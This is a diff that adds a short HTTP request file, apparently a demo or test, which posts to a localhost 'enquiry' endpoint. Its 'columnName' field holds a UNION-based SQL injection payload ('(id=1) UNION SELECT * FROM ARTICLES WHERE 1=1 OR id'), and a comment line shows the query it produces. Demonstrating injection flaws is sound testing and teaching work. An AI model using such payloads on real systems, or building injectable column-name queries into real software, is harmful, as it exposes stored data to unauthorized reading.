@@ -1,0 +1,10 @@
+POST http://localhost:9000/enquiry
+Content-Type: application/json
+
+{
+  "columnName": "(id=1) UNION SELECT * FROM ARTICLES WHERE 1=1 OR id",
+  "columnValue": "1"
+}
+
+### SELECT * FROM ARTICLES WHERE (id=1) UNION SELECT * FROM ARTICLES WHERE 1=1 OR id=1
+
